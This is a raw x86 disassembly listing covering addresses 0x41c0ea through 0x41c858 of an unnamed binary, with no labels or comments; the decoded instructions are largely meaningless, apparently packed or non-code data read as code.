  41c0ea:	mov    ebp,0x3c4fc514
  41c0ef:	jbe    0x41c0f3
  41c0f1:	mov    dh,0xe9
  41c0f3:	xor    bh,BYTE PTR [eax+0x2a9ef911]
  41c0f9:	in     eax,dx
  41c0fa:	dec    edi
  41c0fb:	(bad)  
  41c0fc:	fisubr DWORD PTR [esi]
  41c0fe:	pop    esi
  41c0ff:	stc    
  41c100:	add    dl,bh
  41c102:	mov    gs,WORD PTR [esi+0xb8a3f7c]
  41c108:	ds push eax
  41c10a:	pop    ss
  41c10b:	fild   DWORD PTR [edx]
  41c10d:	or     al,0x55
  41c10f:	mov    edx,DWORD PTR [edx]
  41c111:	jecxz  0x41c0b4
  41c113:	fisubr WORD PTR [esi-0x6f3ccb0b]
  41c119:	daa    
  41c11a:	fwait
  41c11b:	fs pop esp
  41c11d:	adc    ebp,DWORD PTR [eax]
  41c11f:	das    
  41c120:	mov    eax,ds:0x4197b3a8
  41c125:	call   0x2681:0x72afd8c7
  41c12c:	es repnz mov bh,0x17
  41c130:	sub    eax,DWORD PTR [ebx-0x3c414338]
  41c136:	loope  0x41c152
  41c138:	dec    esp
  41c139:	inc    ebx
  41c13a:	(bad)  
  41c13c:	jge    0x41c134
  41c13e:	xor    BYTE PTR [edi],0x69
  41c141:	mov    esi,0x6112f3e3
  41c146:	fs jmp 0x626cf2fb
  41c14c:	or     cl,bh
  41c14e:	sti    
  41c14f:	rol    al,0x3e
  41c152:	xor    al,0xaf
  41c154:	adc    ebx,ebp
  41c156:	jne    0x41c188
  41c158:	add    bl,BYTE PTR [edx]
  41c15a:	mov    BYTE PTR [edx-0x45],cl
  41c15d:	(bad)  
  41c15f:	adc    BYTE PTR [esi],ch
  41c161:	xor    cl,bl
  41c163:	mov    eax,ds:0x6eee5972
  41c168:	jne    0x41c124
  41c16a:	add    ebx,esi
  41c16c:	aas    
  41c16d:	(bad)  
  41c16e:	mov    ah,0xc3
  41c170:	leave  
  41c171:	(bad)  
  41c172:	hlt    
  41c173:	sub    al,0x77
  41c176:	pop    eax
  41c177:	jecxz  0x41c12a
  41c179:	hlt    
  41c17a:	and    DWORD PTR [edx+0x87edc01],0x53a5461
  41c184:	add    al,0xe5
  41c186:	mov    ebx,ds
  41c188:	lock nop
  41c18a:	xlat   BYTE PTR ds:[ebx]
  41c18b:	and    dl,BYTE PTR [ebp-0x4e]
  41c18e:	mov    dl,0x50
  41c190:	jmp    0x41c143
  41c192:	inc    ecx
  41c193:	jnp    0x41c13c
  41c195:	cmp    ecx,0x392f5837
  41c19b:	jl     0x41c12f
  41c19d:	ins    DWORD PTR es:[edi],dx
  41c19e:	sbb    eax,0x2850e88b
  41c1a3:	and    eax,DWORD PTR [edx+ebx*1-0x50]
  41c1a7:	ret    
  41c1a8:	sub    BYTE PTR [ebx+0x7a],0x51
  41c1ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1ad:	xchg   ebx,eax
  41c1ae:	std    
  41c1af:	fadd   DWORD PTR [edi-0x2f]
  41c1b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1b3:	inc    ebp
  41c1b4:	jae    0x41c164
  41c1b6:	jecxz  0x41c1d2
  41c1b8:	pop    ecx
  41c1b9:	mov    DWORD PTR [edx+0x2478f966],0x390122ef
  41c1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1c4:	fisubr WORD PTR [esi-0x3e4505b5]
  41c1ca:	repz in al,dx
  41c1cc:	ds push edx
  41c1ce:	jle    0x41c15f
  41c1d0:	ret    
  41c1d1:	xchg   BYTE PTR [ecx-0x3f],dl
  41c1d4:	data16 fisubr DWORD PTR [ecx-0x423c961]
  41c1db:	dec    eax
  41c1dc:	mov    al,0x79
  41c1de:	inc    ecx
  41c1df:	test   BYTE PTR [esi],cl
  41c1e1:	fdivr  st(1),st
  41c1e3:	mov    gs,WORD PTR [esi]
  41c1e5:	lahf   
  41c1e6:	add    BYTE PTR [edi-0x4d],bh
  41c1e9:	shr    DWORD PTR [eax-0x6b30d165],0xee
  41c1f0:	inc    esi
  41c1f1:	je     0x41c19a
  41c1f3:	jbe    0x41c1f1
  41c1f5:	(bad)  
  41c1f6:	and    edi,DWORD PTR [esi]
  41c1f8:	out    0xe0,al
  41c1fa:	ins    DWORD PTR es:[edi],dx
  41c1fb:	cld    
  41c1fc:	hlt    
  41c1fd:	inc    esp
  41c1fe:	jmp    0x41c278
  41c200:	fwait
  41c201:	repz jle 0x41c23b
  41c204:	je     0x41c1e2
  41c206:	and    edx,ebx
  41c208:	jge    0x41c1ba
  41c20a:	les    eax,FWORD PTR [edx]
  41c20c:	add    al,0xda
  41c20e:	(bad)  
  41c20f:	test   BYTE PTR [ecx+edx*1],0x14
  41c213:	xchg   ecx,eax
  41c214:	adc    al,0x1a
  41c216:	push   esp
  41c217:	push   edx
  41c218:	addr16 pop ecx
  41c21a:	push   0x40
  41c21c:	dec    ebx
  41c21d:	jg     0x41c1fa
  41c21f:	or     ch,BYTE PTR [edi]
  41c221:	fdivr  QWORD PTR [edi+0x60]
  41c224:	inc    esp
  41c225:	inc    edx
  41c226:	dec    ecx
  41c227:	test   eax,0xdb12663
  41c22c:	scas   al,BYTE PTR es:[edi]
  41c22d:	loopne 0x41c247
  41c22f:	je     0x41c1d4
  41c231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c232:	push   edi
  41c233:	fcom   QWORD PTR [ebp-0x47d28ec1]
  41c239:	mov    ebx,0x3cd378e2
  41c23e:	cmp    al,0xc1
  41c240:	cvtps2pd xmm1,xmm7
  41c243:	mov    cl,0xc4
  41c245:	jmp    0xabf52a4e
  41c24a:	ss mov esp,0xdcb84700
  41c250:	int3   
  41c251:	adc    ah,ch
  41c253:	shr    BYTE PTR [esi+eiz*1],cl
  41c256:	xchg   edi,eax
  41c257:	xor    edi,DWORD PTR [ecx-0x72]
  41c25a:	jecxz  0x41c27b
  41c25c:	enter  0xda2c,0x95
  41c260:	pushf  
  41c261:	ror    ecx,cl
  41c263:	call   0xc6891151
  41c268:	push   ds
  41c269:	cmc    
  41c26a:	out    0x68,al
  41c26c:	pop    ds
  41c26d:	cs stc 
  41c26f:	pop    ecx
  41c270:	add    DWORD PTR [edi+0x1e],ecx
  41c273:	or     al,0x1
  41c275:	pop    es
  41c276:	dec    edx
  41c277:	add    al,0x23
  41c279:	jo     0x41c200
  41c27b:	mov    BYTE PTR [ebx-0x59],al
  41c27e:	cmp    edi,DWORD PTR ds:0xabbf725e
  41c284:	inc    esp
  41c285:	loope  0x41c21c
  41c287:	mov    ch,dl
  41c289:	fs add dh,ch
  41c28c:	inc    ecx
  41c28d:	call   0x3c5e:0xd08bd7ea
  41c294:	cmp    eax,0x37631964
  41c299:	or     DWORD PTR [ecx-0x38],edx
  41c29c:	mov    DWORD PTR ds:0xe3162ae8,0x796a73d5
  41c2a6:	lock test DWORD PTR [ebp+edx*4+0x65170f9a],ebx
  41c2ae:	push   ebx
  41c2af:	loope  0x41c275
  41c2b1:	adc    edi,0xabda4def
  41c2b7:	lods   al,BYTE PTR ds:[esi]
  41c2b8:	retf   0x5ecc
  41c2bb:	lahf   
  41c2bc:	cmp    edx,DWORD PTR [ecx]
  41c2be:	cmp    DWORD PTR [edi-0x80],ecx
  41c2c1:	push   esp
  41c2c2:	sbb    al,BYTE PTR [edi-0x1a]
  41c2c5:	pop    edx
  41c2c6:	cmp    ebx,DWORD PTR ds:0x3418587f
  41c2cc:	std    
  41c2cd:	and    BYTE PTR [edx],dl
  41c2cf:	(bad)  
  41c2d0:	(bad)  
  41c2d1:	mov    bh,0x63
  41c2d3:	je     0x41c2cb
  41c2d5:	pop    edi
  41c2d6:	sbb    cl,cl
  41c2d8:	sub    DWORD PTR [edx+0x2],ebp
  41c2db:	popf   
  41c2dc:	aaa    
  41c2dd:	pop    esp
  41c2de:	(bad)  
  41c2df:	and    DWORD PTR [ecx-0x1f],edx
  41c2e2:	xor    esp,DWORD PTR [edx]
  41c2e4:	gs push ss
  41c2e6:	jmp    0x41c29e
  41c2e8:	pop    ecx
  41c2e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2ea:	inc    ecx
  41c2eb:	loope  0x41c2a2
  41c2ed:	xlat   BYTE PTR ds:[ebx]
  41c2ee:	mov    BYTE PTR [eax],bh
  41c2f0:	frstor [ebx]
  41c2f2:	jns    0x41c36f
  41c2f4:	test   eax,0xdb53a9cc
  41c2f9:	adc    eax,0x8a00decc
  41c2fe:	out    dx,eax
  41c2ff:	jbe    0x41c350
  41c301:	int3   
  41c302:	(bad)  
  41c303:	fiadd  WORD PTR [esi+ebx*2-0x5f]
  41c307:	cmp    DWORD PTR [ecx+esi*1-0x280a816c],edi
  41c30e:	stos   BYTE PTR es:[edi],al
  41c30f:	jecxz  0x41c2a4
  41c311:	and    eax,0x4dfd060f
  41c316:	add    eax,0x9b2b8b2b
  41c31b:	lods   eax,DWORD PTR ds:[esi]
  41c31c:	push   0x920242b2
  41c321:	sub    al,0x8e
  41c323:	or     al,0x35
  41c325:	or     BYTE PTR [ebx+edi*2-0x25],dl
  41c329:	imul   ebx,eax,0xffffffa2
  41c32c:	pop    eax
  41c32d:	ret    0x9242
  41c330:	aad    0xfd
  41c332:	ror    ebx,cl
  41c334:	hlt    
  41c335:	int    0x79
  41c337:	mov    al,0x70
  41c339:	enter  0x5ec9,0xfb
  41c33d:	xchg   edx,eax
  41c33e:	neg    dl
  41c340:	aam    0xd2
  41c342:	ja     0x41c322
  41c344:	jbe    0x41c2df
  41c346:	outs   dx,DWORD PTR ds:[esi]
  41c347:	jne    0x41c2d0
  41c349:	fiadd  WORD PTR [ebx-0xe]
  41c34c:	es aas 
  41c34e:	dec    edx
  41c34f:	das    
  41c350:	push   ebp
  41c351:	mov    eax,ds:0x2d8762cf
  41c356:	pushf  
  41c357:	pop    ecx
  41c358:	xor    cl,BYTE PTR [ebx-0x26]
  41c35b:	pop    edx
  41c35c:	jo     0x41c353
  41c35e:	xchg   edi,eax
  41c35f:	sub    bl,BYTE PTR [ebp-0x589c2544]
  41c365:	je     0x41c3ba
  41c367:	cmp    ebp,0x68d2722d
  41c36d:	fisttp WORD PTR [ebp+0x1b]
  41c370:	aas    
  41c371:	es dec ecx
  41c373:	sub    cl,dh
  41c375:	pop    ecx
  41c376:	pop    edi
  41c377:	loop   0x41c3f4
  41c379:	mov    ebx,0x46591b3
  41c37e:	enter  0x4da1,0x81
  41c382:	dec    edx
  41c383:	ds adc al,0x18
  41c386:	mov    ebx,0x3ae6f096
  41c38b:	retf   
  41c38c:	add    ah,bh
  41c38e:	into   
  41c38f:	adc    DWORD PTR [edi-0x572e54dc],edx
  41c395:	cld    
  41c396:	jecxz  0x41c332
  41c398:	push   es
  41c399:	das    
  41c39a:	out    dx,eax
  41c39b:	popa   
  41c39c:	pop    ss
  41c39d:	stc    
  41c39e:	cdq    
  41c39f:	ds sub ebx,ebx
  41c3a2:	inc    ebp
  41c3a3:	mov    edi,0x214b606b
  41c3a8:	das    
  41c3a9:	cs out dx,al
  41c3ab:	push   ds
  41c3ac:	jmp    0x61b9:0x8b3eab2f
  41c3b3:	iret   
  41c3b4:	and    dl,dl
  41c3b6:	mov    edi,0x11b6d51c
  41c3bb:	clc    
  41c3bc:	repnz jmp 0x2878:0x7ee1a375
  41c3c4:	outs   dx,BYTE PTR ds:[esi]
  41c3c5:	xchg   edx,eax
  41c3c6:	mov    ds:0x9d6342e2,eax
  41c3cb:	push   ecx
  41c3cc:	dec    ebx
  41c3cd:	shr    eax,1
  41c3cf:	mov    ch,0x24
  41c3d1:	dec    eax
  41c3d2:	sbb    ebp,esp
  41c3d4:	scas   al,BYTE PTR es:[edi]
  41c3d5:	lds    ecx,FWORD PTR [esi-0x54]
  41c3d8:	out    0x9,eax
  41c3da:	push   es
  41c3db:	adc    al,dh
  41c3dd:	dec    eax
  41c3de:	mov    bh,0xe2
  41c3e0:	inc    eax
  41c3e1:	push   esp
  41c3e2:	pop    ds
  41c3e3:	pop    ebp
  41c3e5:	add    eax,0xd84a4efa
  41c3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3eb:	stc    
  41c3ec:	and    ah,bh
  41c3ee:	push   0xe69dced9
  41c3f3:	xor    bh,BYTE PTR [esi+0x1275833c]
  41c3f9:	jno    0x41c37e
  41c3fb:	test   BYTE PTR [ecx-0x2],dl
  41c3fe:	cdq    
  41c3ff:	cdq    
  41c400:	cmp    edx,ecx
  41c402:	xchg   edx,eax
  41c403:	data16 jecxz 0x41c434
  41c406:	das    
  41c407:	mov    dl,dh
  41c409:	sub    BYTE PTR [eax+0x71],dl
  41c40c:	mov    edi,0x296ba241
  41c411:	retf   
  41c412:	and    al,0x25
  41c414:	stos   DWORD PTR es:[edi],eax
  41c415:	push   ds
  41c416:	mov    ah,0x13
  41c418:	dec    edx
  41c419:	adc    al,0xc4
  41c41b:	cmp    BYTE PTR [ebp+0xb],0x0
  41c41f:	ds mov bh,dl
  41c422:	adc    esp,DWORD PTR [edi-0x10]
  41c425:	aad    0x91
  41c427:	scas   al,BYTE PTR es:[edi]
  41c428:	mov    bh,0x14
  41c42a:	inc    esi
  41c42b:	scas   eax,DWORD PTR es:[edi]
  41c42c:	mov    bl,ch
  41c42e:	add    eax,0xb33be3da
  41c433:	(bad)  
  41c434:	out    dx,eax
  41c435:	or     BYTE PTR [ecx+edi*8+0x564e1a58],al
  41c43c:	push   ecx
  41c43d:	mov    ds:0xe0b644bb,eax
  41c442:	out    dx,eax
  41c443:	ins    DWORD PTR es:[edi],dx
  41c444:	cs pop ecx
  41c446:	cmp    BYTE PTR [edx],0x3
  41c449:	cmp    eax,0x86c81f91
  41c44e:	adc    ch,al
  41c450:	loop   0x41c4ab
  41c452:	scas   eax,DWORD PTR es:[edi]
  41c453:	pusha  
  41c454:	fdivr  st,st(7)
  41c456:	adc    al,BYTE PTR [eax+0x1c]
  41c459:	or     BYTE PTR [edi],ch
  41c45b:	popa   
  41c45c:	add    ch,BYTE PTR [eax*1-0xb578ece]
  41c463:	ror    DWORD PTR [esi+0x421fd599],0xee
  41c46a:	mov    ds:0x94afb1fe,eax
  41c46f:	out    0x1d,eax
  41c471:	lea    edi,[ecx]
  41c473:	and    DWORD PTR [edi],esi
  41c475:	mov    eax,0xa97c52a7
  41c47a:	idiv   DWORD PTR [edx]
  41c47c:	repnz idiv BYTE PTR [edx+0x13]
  41c480:	and    al,0x2b
  41c482:	ja     0x41c42e
  41c484:	pop    ebx
  41c485:	pop    ebp
  41c486:	mov    edx,0x88bb3de3
  41c48b:	je     0x41c418
  41c48d:	sub    ah,al
  41c48f:	xchg   edi,eax
  41c490:	push   edi
  41c491:	das    
  41c492:	(bad)
  41c495:	jg     0x41c4dd
  41c497:	dec    edi
  41c498:	in     eax,dx
  41c499:	(bad)  
  41c49a:	sbb    BYTE PTR [ecx-0x62b48a3a],dl
  41c4a0:	lods   eax,DWORD PTR ds:[esi]
  41c4a1:	hlt    
  41c4a2:	jo     0x41c4db
  41c4a4:	sub    DWORD PTR [ecx-0x42],ebx
  41c4a7:	add    ebx,DWORD PTR [ebx+0x5b]
  41c4aa:	and    eax,0x4f781edd
  41c4af:	and    esi,DWORD PTR [eax-0x80]
  41c4b2:	rol    BYTE PTR [ebx],cl
  41c4b4:	jmp    0x267f6ef2
  41c4b9:	jmp    0x51f5:0xa617ec3a
  41c4c0:	dec    edx
  41c4c1:	fwait
  41c4c2:	arpl   sp,cx
  41c4c4:	jb     0x41c4fc
  41c4c6:	inc    ebp
  41c4c7:	and    al,0x65
  41c4c9:	hlt    
  41c4ca:	xor    edi,0xdd8ba06a
  41c4d0:	retf   0x70ff
  41c4d3:	inc    edi
  41c4d4:	jle    0x41c4df
  41c4d6:	ja     0x41c49b
  41c4d8:	out    dx,al
  41c4d9:	sub    BYTE PTR [ebx+0x69],ah
  41c4dc:	jg     0x41c47d
  41c4de:	dec    esp
  41c4df:	repnz mov esp,0x4ce72ab
  41c4e5:	push   0xa93508e0
  41c4ea:	xchg   DWORD PTR [eax-0x4eacbd96],ebp
  41c4f0:	jo     0x41c4b0
  41c4f2:	dec    esp
  41c4f3:	fs scas al,BYTE PTR es:[edi]
  41c4f5:	test   al,0xf2
  41c4f7:	lods   eax,DWORD PTR ds:[esi]
  41c4f8:	imul   edi,DWORD PTR [ecx-0x43f965c8],0xffffffb8
  41c4ff:	call   0x5664:0x7fd607f3
  41c506:	test   eax,0xce7b1391
  41c50b:	out    0x88,al
  41c50d:	cli    
  41c50e:	dec    ebp
  41c50f:	call   DWORD PTR [esi-0x10e06ebf]
  41c515:	jmp    0xca0c:0x27afefb7
  41c51c:	inc    ebx
  41c51d:	sahf   
  41c51e:	or     bh,BYTE PTR [ebx-0x25]
  41c521:	mov    esi,0x7befcac5
  41c526:	int    0x3a
  41c528:	push   esp
  41c529:	cmc    
  41c52a:	ror    BYTE PTR [esp+eax*1],cl
  41c52d:	fwait
  41c52e:	xchg   ebp,ecx
  41c530:	and    esi,edi
  41c532:	inc    bh
  41c534:	sar    BYTE PTR [esi-0x3166101b],1
  41c53a:	push   ds
  41c53b:	cmp    BYTE PTR [eax-0x2b],0x53
  41c53f:	call   0x63a6bcea
  41c544:	mov    edi,0x757b52f5
  41c549:	fnclex 
  41c54b:	leave  
  41c54c:	sub    eax,0xdd878f82
  41c551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c552:	ss cs dec ebx
  41c555:	or     ch,0x96
  41c558:	nop    DWORD PTR [ecx+0x38]
  41c55c:	jo     0x41c5c3
  41c55e:	rcr    BYTE PTR [ebp-0x6d034aba],cl
  41c564:	dec    ebx
  41c565:	outs   dx,BYTE PTR ds:[esi]
  41c566:	cdq    
  41c567:	fiadd  WORD PTR [ebx-0x5d]
  41c56a:	mov    edi,DWORD PTR ds:[ebx+eax*8+0x713d5c38]
  41c572:	hlt    
  41c573:	mov    al,ds:0xab6656e7
  41c578:	mov    esi,0xb3dfde5d
  41c57d:	xchg   ebx,eax
  41c57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c57f:	lods   eax,DWORD PTR ds:[esi]
  41c580:	sbb    BYTE PTR [esi-0x15],bh
  41c583:	pop    esi
  41c584:	hlt    
  41c585:	ins    DWORD PTR es:[edi],dx
  41c586:	dec    esi
  41c587:	pop    ss
  41c588:	out    dx,eax
  41c589:	enter  0xc49c,0x76
  41c58d:	clc    
  41c58e:	ins    DWORD PTR es:[edi],dx
  41c58f:	jo     0x41c558
  41c591:	hlt    
  41c592:	pop    edx
  41c593:	cmp    ah,bl
  41c595:	adc    BYTE PTR [esi-0x1d1ce1ce],ah
  41c59b:	div    dh
  41c59d:	lock xor al,0x9a
  41c5a0:	repnz xor ebx,DWORD PTR [eax-0x31ec0bac]
  41c5a7:	icebp  
  41c5a8:	cdq    
  41c5a9:	sbb    eax,0x4e812d08
  41c5ae:	out    0x62,eax
  41c5b0:	and    eax,0xfa11cf5
  41c5b5:	outs   dx,DWORD PTR ds:[esi]
  41c5b6:	test   eax,esp
  41c5b8:	push   eax
  41c5b9:	xlat   BYTE PTR ds:[ebx]
  41c5ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5bb:	(bad)  
  41c5bc:	popf   
  41c5bd:	xchg   edx,eax
  41c5be:	xor    eax,DWORD PTR [edi+0x1740fd18]
  41c5c4:	xor    ecx,DWORD PTR [edx-0x126db57d]
  41c5ca:	scas   al,BYTE PTR es:[edi]
  41c5cb:	ret    0xd4cf
  41c5ce:	fs add ebp,DWORD PTR ds:[eax]
  41c5d2:	mov    ebx,0xdfe9f349
  41c5d7:	clc    
  41c5d8:	push   eax
  41c5d9:	outs   dx,WORD PTR ds:[esi]
  41c5db:	adc    al,0x4d
  41c5dd:	sti    
  41c5de:	stos   BYTE PTR es:[edi],al
  41c5df:	cs inc ebx
  41c5e1:	bound  ebx,QWORD PTR [edx-0x41]
  41c5e4:	fld    DWORD PTR [esi-0x230256c1]
  41c5ea:	sar    bl,1
  41c5ec:	cld    
  41c5ed:	push   eax
  41c5ee:	xchg   edi,eax
  41c5ef:	xor    BYTE PTR [ebx+0x7e],dl
  41c5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5f3:	fsubrp st(2),st
  41c5f5:	stc    
  41c5f6:	mov    bl,0xe5
  41c5f8:	ds jecxz 0x41c57f
  41c5fb:	cmp    ebp,DWORD PTR ds:0x50db132d
  41c601:	sahf   
  41c602:	inc    edx
  41c603:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41c605:	mov    BYTE PTR [esi+eiz*2-0x45d0e65c],ah
  41c60c:	jbe    0x41c62f
  41c60e:	or     esp,esp
  41c610:	push   cs
  41c611:	mov    ds:0x230fa6df,eax
  41c616:	rcl    DWORD PTR [edx-0x4e],1
  41c619:	std    
  41c61a:	ror    DWORD PTR [ecx-0x52b9b059],cl
  41c620:	fstp   QWORD PTR [eax+0x65ba088a]
  41c626:	jg     0x41c5f7
  41c628:	xor    BYTE PTR [eax-0x1],bh
  41c62b:	adc    al,0x29
  41c62d:	xor    cl,ch
  41c62f:	int3   
  41c630:	and    eax,0x702c55bd
  41c635:	sbb    esi,DWORD PTR [eax-0x70c7debf]
  41c63b:	jae    0x41c61d
  41c63d:	xchg   esp,eax
  41c63e:	aaa    
  41c63f:	lods   eax,DWORD PTR ds:[esi]
  41c640:	bound  esp,QWORD PTR [edi+edi*1+0x3fd7d1c1]
  41c647:	mov    eax,ds:0xb390e8c1
  41c64c:	cmp    DWORD PTR [ebp-0x59563011],ebx
  41c652:	dec    ecx
  41c653:	mov    ss,WORD PTR [ebx]
  41c655:	adc    edi,DWORD PTR [edi-0x7a85f8aa]
  41c65b:	xor    ebx,DWORD PTR [ebp+0x7d2c323b]
  41c661:	and    BYTE PTR [esi],0xc0
  41c664:	popf   
  41c665:	push   es
  41c666:	mov    ch,0xd9
  41c668:	jp     0x41c62e
  41c66a:	pop    eax
  41c66b:	daa    
  41c66c:	inc    esi
  41c66d:	iret   
  41c66e:	sti    
  41c66f:	mov    edi,0xc3ca8e81
  41c674:	adc    DWORD PTR [ecx],edi
  41c676:	pop    ebp
  41c677:	shl    dl,cl
  41c679:	sub    ebp,DWORD PTR [edi-0x1940d9ec]
  41c67f:	repnz add ebx,DWORD PTR [ebx]
  41c682:	xor    eax,edi
  41c684:	dec    ebp
  41c685:	out    dx,eax
  41c686:	lahf   
  41c687:	jmp    0x5dacd37c
  41c68c:	push   esp
  41c68d:	jp     0x41c6c8
  41c68f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c690:	mov    al,0x23
  41c692:	dec    esi
  41c693:	adc    DWORD PTR [ebx-0x51],0x1ec793ee
  41c69a:	lock xchg edx,eax
  41c69c:	pushf  
  41c69d:	fwait
  41c69e:	cmp    edi,edi
  41c6a0:	rcr    DWORD PTR [ebp+0x6a5780dd],cl
  41c6a6:	dec    ebp
  41c6a7:	lds    edi,FWORD PTR [ebp+edx*2+0x1b]
  41c6ab:	je     0x41c63e
  41c6ad:	push   ecx
  41c6ae:	rcl    BYTE PTR [eax+eiz*1-0x923d476],cl
  41c6b5:	xchg   ecx,eax
  41c6b6:	out    dx,al
  41c6b7:	mov    bl,0x2f
  41c6b9:	lods   al,BYTE PTR ds:[esi]
  41c6ba:	jge    0x41c686
  41c6bc:	stos   BYTE PTR es:[edi],al
  41c6bd:	cli    
  41c6be:	je     0x41c67f
  41c6c0:	fdivp  st(0),st
  41c6c2:	test   eax,0x8c1ccb25
  41c6c7:	and    ebx,DWORD PTR [esi]
  41c6c9:	sbb    DWORD PTR [edi+ebp*8-0x1f],esi
  41c6cd:	ror    DWORD PTR [edx-0x101cf860],cl
  41c6d3:	cmp    ebp,DWORD PTR [esi-0xf]
  41c6d6:	xlat   BYTE PTR ds:[ebx]
  41c6d7:	in     al,0x1c
  41c6d9:	mov    dl,0x68
  41c6db:	mov    edi,0x1e88aa1f
  41c6e0:	sub    ch,cl
  41c6e2:	and    eax,0x7a30f82e
  41c6e7:	aas    
  41c6e8:	mov    ch,0x24
  41c6ea:	jg     0x41c671
  41c6ec:	xchg   BYTE PTR [ecx-0x31],dl
  41c6ef:	test   DWORD PTR [esi-0x2d],edi
  41c6f2:	sub    bh,ah
  41c6f4:	or     DWORD PTR [edi],ecx
  41c6f6:	lds    ecx,FWORD PTR [edi]
  41c6f8:	enter  0x2db,0x17
  41c6fc:	in     eax,0xd4
  41c6fe:	mov    ah,dh
  41c700:	mov    cl,BYTE PTR [esi]
  41c702:	jge    0x41c745
  41c704:	out    0xec,al
  41c706:	(bad)  
  41c707:	mov    esi,0x749b22ab
  41c70c:	sbb    al,0x74
  41c70e:	je     0x41c782
  41c710:	fs push ebp
  41c712:	add    BYTE PTR [esi+0x581cfdd5],ah
  41c718:	add    eax,0xd60f03ae
  41c71d:	mov    ecx,esp
  41c71f:	push   ecx
  41c720:	sar    DWORD PTR [ecx-0x2b],0x4d
  41c724:	push   edx
  41c725:	mov    esi,cs
  41c727:	ds mov ebx,0xeaff3fb8
  41c72d:	jno    0x41c76b
  41c72f:	lods   al,BYTE PTR ds:[esi]
  41c730:	mov    ecx,0x986ba705
  41c735:	stc    
  41c736:	jle    0x41c748
  41c738:	pushf  
  41c739:	test   BYTE PTR [edx+ebx*2+0x6f],dh
  41c73d:	popf   
  41c73e:	lahf   
  41c73f:	adc    ch,bh
  41c741:	push   ecx
  41c742:	in     eax,dx
  41c743:	mov    DWORD PTR [ecx+0x44],esp
  41c746:	xchg   esp,eax
  41c747:	inc    edx
  41c748:	mov    WORD PTR [eax+0x2],es
  41c74b:	mov    cl,0x27
  41c74d:	aad    0x88
  41c74f:	xchg   esi,eax
  41c750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c751:	mov    edx,0x62c9bb0f
  41c756:	dec    edx
  41c757:	aad    0x25
  41c759:	sub    dl,BYTE PTR [esp+ebx*2+0x1b]
  41c75d:	push   ss
  41c75e:	pop    edx
  41c75f:	add    DWORD PTR [edx+0x6bd98d79],0x8ea4fb1d
  41c769:	ror    DWORD PTR [ebx-0xa63942a],1
  41c76f:	mov    WORD PTR [edi-0xc98d40d],fs
  41c775:	clc    
  41c776:	pop    ecx
  41c777:	push   ebp
  41c778:	nop
  41c779:	imul   eax,ecx,0x3764c5a3
  41c77f:	mov    ds:0x4ae7801,eax
  41c784:	in     al,dx
  41c785:	sub    al,0x2c
  41c787:	hlt    
  41c788:	stos   DWORD PTR es:[edi],eax
  41c789:	call   0xc0ea:0xc296a17a
  41c790:	pop    ecx
  41c791:	outs   dx,DWORD PTR ds:[esi]
  41c792:	and    DWORD PTR [ebx+0x4b01a895],0x49c25de2
  41c79c:	adc    DWORD PTR [edi],edi
  41c79e:	(bad)  
  41c7a0:	into   
  41c7a1:	xlat   BYTE PTR ds:[ebx]
  41c7a2:	sub    ecx,DWORD PTR [edi+0x24]
  41c7a5:	ss mov al,0xe3
  41c7a8:	shl    DWORD PTR [ebx],0xef
  41c7ab:	mov    cl,0x5e
  41c7ad:	ret    0x61c5
  41c7b0:	adc    edx,DWORD PTR [esi+esi*1-0x40]
  41c7b4:	(bad)  
  41c7b6:	dec    edx
  41c7b7:	sub    eax,0x5d0783a6
  41c7bc:	add    BYTE PTR [ebp-0x7efffbf5],dh
  41c7c2:	xor    esi,ecx
  41c7c4:	lods   eax,DWORD PTR ds:[esi]
  41c7c5:	mov    ds:0x9cf5fdaf,al
  41c7ca:	fstp   QWORD PTR [eax+0x7]
  41c7cd:	cmp    dl,BYTE PTR [ebp-0x31]
  41c7d0:	push   0x87cd3ece
  41c7d5:	push   ecx
  41c7d6:	xchg   ebp,eax
  41c7d8:	xor    al,0x10
  41c7da:	out    dx,al
  41c7db:	sub    edx,DWORD PTR [edi+0x6d17bb78]
  41c7e1:	jo     0x41c81e
  41c7e3:	xchg   ebp,eax
  41c7e4:	arpl   WORD PTR [edx+eiz*4+0x7af623bf],dx
  41c7eb:	das    
  41c7ec:	scas   eax,DWORD PTR es:[edi]
  41c7ed:	scas   al,BYTE PTR es:[edi]
  41c7ee:	outs   dx,DWORD PTR ds:[esi]
  41c7ef:	or     al,0xe
  41c7f1:	call   0x7c99c1
  41c7f6:	aas    
  41c7f7:	ror    ebp,1
  41c7f9:	push   ebp
  41c7fa:	mov    edx,0xb9644569
  41c7ff:	ins    DWORD PTR es:[edi],dx
  41c800:	and    DWORD PTR [ebp+0x13],edi
  41c803:	rol    BYTE PTR ds:0x6f8f32b5,cl
  41c809:	(bad)  
  41c80a:	fwait
  41c80b:	sub    eax,0xea22a7b1
  41c810:	rcr    edi,1
  41c812:	sbb    DWORD PTR [esi],ecx
  41c814:	push   edx
  41c815:	scas   eax,DWORD PTR es:[edi]
  41c816:	fild   DWORD PTR [edx]
  41c818:	xor    al,0xdc
  41c81a:	add    al,0xf4
  41c81c:	loop   0x41c814
  41c81e:	mov    WORD PTR [esi-0x4548a176],ss
  41c824:	test   al,0xb5
  41c826:	daa    
  41c827:	cmc    
  41c828:	enter  0xf3c3,0x8d
  41c82c:	into   
  41c82d:	add    BYTE PTR [ecx],0xef
  41c830:	jmp    0xffa9:0xf198c3b6
  41c837:	dec    esp
  41c838:	dec    eax
  41c839:	sub    ebp,DWORD PTR [ecx-0x7f]
  41c83c:	mov    dl,0xce
  41c83e:	sub    eax,0x5ba376a
  41c843:	(bad)  
  41c844:	xor    eax,0x54df8467
  41c849:	call   0xc632:0x452f5bbd
  41c850:	push   eax
  41c851:	leave  
  41c852:	fistp  QWORD PTR [edi-0xee44440]
  41c858:	pop    ds
